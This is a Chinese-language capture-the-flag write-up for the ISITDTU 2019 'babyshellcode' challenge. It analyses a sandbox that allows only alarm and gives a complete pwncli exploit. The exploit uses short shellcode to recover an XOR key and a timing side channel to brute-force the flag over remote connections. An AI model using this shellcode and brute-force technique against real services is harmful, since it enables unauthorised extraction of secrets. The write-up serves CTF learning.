# isitdtu2019_babyshellcode



### 总结

侧信道攻击，爆破出`flag`。这里对`shellcode`的长度有限制，所以需要尽量写较短的`shellcode`完成利用。

<!-- more -->

### 题目分析

#### checksec

![image-20211211165856153](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211211165856153.png)

同时发现有沙盒，读取输入后，只能使用`alarm`系统调用：

![image-20211211170404899](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211211170404899.png)

#### 函数分析

##### init

在`_init`段注册了一个函数：

![image-20211211170507782](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211211170507782.png)

主要流程为：

- `mmap`一块内存，起始地址为`0xcafe000`，页权限为可读可写可执行
- 读取`flag`到`0xcafe000`
- 从`/dev/urandom`读取`8`个字节，存储在一个整数变量中
- 按每`8`个字节与`flag`进行异或

##### main

![image-20211211170818009](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211211170818009.png)

主要就是读取用户输入，然后执行`shellcode`。在`0x202020`处拷贝了`shellcode`，如下：

![image-20211211170955137](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211211170955137.png)

### 利用思路

- 使用`alarm`调用取消定时
- 利用`flag`的特征求解出异或的`key`。`flag`为`uuid`字符串时，长度为`42`，且有些字符是已知的，包括`flag{}-`。

- 利用测信道攻击，爆破出`flag`。思路为：逐个字节比较，如果猜测成功，那么将程序陷入死循环，否则程序会异常终止。
- 猜到所有的`flag`

### EXP

考虑到`flag`的特征，其实这里可以只把猜测的范围限制为`0123456789abcdef`，加快爆破的速度。这份`exp`将范围扩大了一些（偷懒）。

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
from pwncli import *

cli_script()

debug = gift.debug
filename = gift.filename

if not debug:
    ip = gift.ip
    port = gift.port

# flag{2bb747aa-dabb-4826-a4d7-9fcb98b949f8}

shellcode = """
    /* alarm(0) */
    mov al, 0x25
    syscall
    /* recover key */
    mov ebp, 0xcafe000
    mov eax, dword ptr [rbp]
    xor eax, 0x67616c66
    mov ebx, dword ptr [rbp+0x28+4]
    shl rbx, 32
    or rbx, rax

    /* recover flag */
L1:
    xor qword ptr [rbp + 8 * rdx], rbx
    inc edx
    cmp dl, 6
    jnz L1
L2:
    cmp byte ptr [rbp + {}], {}
    jz L2 /* stuck */
"""

idx = 0
flag = ""

for _ in range(42):
    err = True
    for i in bytearray(b"-{{}}flagbcde0123456789"):
        if debug:
            io = process(filename)
        else:
            io = remote(ip, port)
        io.send(asm(shellcode.format(idx, hex(i))))
        if io.can_recv_raw(3):
            io.close()
            continue
        else:
            flag += chr(i)
            print(f"Now flag is : {flag}")
            io.close()
            err = False
            break
    if err:
        error("This round is wrong!")
    
    idx += 1

```

![image-20211211174251249](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211211174251249.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2021-12-11-isitdtu2019-babyshellcode/  

